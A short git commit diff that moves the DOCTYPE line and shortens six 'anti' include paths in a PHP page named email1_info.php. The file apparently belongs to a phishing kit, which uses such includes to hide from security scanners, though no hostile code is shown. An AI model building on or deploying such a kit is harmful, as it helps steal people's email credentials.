f374e7ff37766566fc00d907fd21cd3b3ce519b8
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-14 11:09:06 +0200

    Update email1_info.php

--- email1_info.php
+++ email1_info.php
@@ -1,15 +1,13 @@
-<!DOCTYPE html>
 <?php
 session_start();
-include "../anti/anti1.php";
-include "../anti/anti2.php"; 
-include "../anti/anti3.php"; 
-include "../anti/anti4.php"; 
-include "../anti/anti5.php"; 
-include "../anti/anti7.php"; 
-
-
+include "anti/anti1.php";
+include "anti/anti2.php"; 
+include "anti/anti3.php"; 
+include "anti/anti4.php"; 
+include "anti/anti5.php"; 
+include "anti/anti7.php";
 ?>
+<!DOCTYPE html>
 <html lang="en"><head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
